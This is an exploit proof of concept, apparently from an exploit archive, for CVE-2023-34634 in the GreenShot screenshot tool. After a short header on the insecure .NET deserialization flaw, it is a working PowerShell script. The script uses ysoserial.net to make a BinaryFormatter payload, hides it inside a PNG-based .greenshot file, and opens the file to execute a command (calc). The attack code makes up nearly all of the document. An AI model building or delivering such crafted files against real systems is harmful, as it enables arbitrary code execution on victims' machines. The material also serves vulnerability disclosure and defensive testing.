﻿# Exploit Title: GreenShot  1.2.10 - Insecure Deserialization Arbitrary Code Execution
# Date: 26/07/2023
# Exploit Author: p4r4bellum
# Vendor Homepage: https://getgreenshot.org
# Software Link: https://getgreenshot.org/downloads/
# Version: 1.2.6.10
# Tested on: windows 10.0.19045 N/A build 19045
# CVE : CVE-2023-34634
#
# GreenShot 1.2.10 and below is vulnerable to an insecure object deserialization in its custom *.greenshot format
# A stream of .Net object is serialized and inscureley deserialized when a *.greenshot file is open with the software
# On a default install the *.greenshot file extension is associated with the programm, so double-click on a*.greenshot file
# will lead to arbitrary code execution
#
# Generate the payload. You need yserial.net to be installed on your machine. Grab it at https://github.com/pwntester/ysoserial.net
./ysoserial.exe -f BinaryFormatter -g WindowsIdentity  -c "calc" --outputpath payload.bin -o raw
#load the payload
$payload = Get-Content .\payload.bin -Encoding Byte
# retrieve the length of the payload
$length = $payload.Length
# load the required assembly to craft a PNG file
Add-Type -AssemblyName System.Drawing
# the following lines creates a png file with some text. Code borrowed from https://stackoverflow.com/questions/2067920/can-i-draw-create-an-image-with-a-given-text-with-powershell
$filename = "$home\poc.greenshot"
$bmp = new-object System.Drawing.Bitmap 250,61 
$font = new-object System.Drawing.Font Consolas,24 
$brushBg = [System.Drawing.Brushes]::Green 
$brushFg = [System.Drawing.Brushes]::Black 
$graphics = [System.Drawing.Graphics]::FromImage($bmp) 
$graphics.FillRectangle($brushBg,0,0,$bmp.Width,$bmp.Height) 
$graphics.DrawString('POC Greenshot',$font,$brushFg,10,10) 
$graphics.Dispose() 
$bmp.Save($filename) 

# append the payload to the PNG file
$payload | Add-Content -Path $filename -Encoding Byte -NoNewline 
# append the length of the payload
[System.BitConverter]::GetBytes([long]$length) | Add-Content -Path $filename -Encoding  Byte -NoNewline
# append the signature
"Greenshot01.02" | Add-Content -path $filename -NoNewline -Encoding Ascii
# launch greenshot. Calc.exe should be executed
Invoke-Item  $filename